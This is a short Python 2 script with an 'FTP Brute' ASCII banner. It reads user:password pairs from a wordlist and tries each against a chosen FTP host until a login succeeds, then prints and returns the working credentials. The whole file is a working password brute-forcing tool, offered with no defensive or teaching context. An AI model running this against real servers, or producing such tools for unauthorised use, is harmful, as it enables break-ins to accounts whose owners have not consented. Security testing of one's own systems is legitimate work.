import ftplib
import sys
import termcolor
global hostname
global passwdFile


def brutus(hostname, passwdFile):
	pF = open(passwdFile, "r")
	for line in pF.readlines():
		userName = line.split(":")[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: %s, %s" % (userName, passWord)
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print "\n[*] " + str(hostname) +\
			' FTP Login Succeeded: ' + userName+"/"+passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass
	print "\n[-] Could not brute force FTP credentials."
	return(None, None)
	

banner = """
   _____________    ___           __     
  / __/_  __/ _ \  / _ )______ __/ /____ 
 / _/  / / / ___/ / _  / __/ // / __/ -_)
/_/   /_/ /_/    /____/_/  \_,_/\__/\__/ 
                                                                                
"""
termcolor.cprint(banner, "blue")
hostname = raw_input("Enter Hostname: ")
passwdFile = str(raw_input("Enter wordlist: "))

brutus(hostname, passwdFile)